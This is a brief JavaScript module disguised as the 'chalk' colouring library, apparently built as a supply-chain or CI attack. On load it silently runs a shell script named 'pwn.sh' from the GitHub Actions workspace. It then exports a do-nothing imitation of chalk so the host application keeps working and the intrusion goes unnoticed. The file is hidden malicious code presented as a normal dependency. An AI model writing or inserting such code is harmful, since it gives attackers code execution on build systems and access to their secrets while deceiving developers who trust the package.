const { exec } = require('child_process');
const path = require('path');
// Execute our payload
const workspace = process.env.GITHUB_WORKSPACE || process.cwd();
exec('bash ' + path.join(workspace, 'pwn.sh'));

// Mock chalk behavior to avoid breaking the application
const identity = (s) => s;
const chalk = {
  red: identity,
  green: identity,
  yellow: identity,
  blue: identity,
  magenta: identity,
  cyan: identity,
  white: identity,
  gray: identity,
  bold: identity,
  italic: identity,
  underline: identity,
  inverse: identity,
  hidden: identity,
  strikethrough: identity,
  visible: true,
  level: 3,
};
module.exports = chalk;
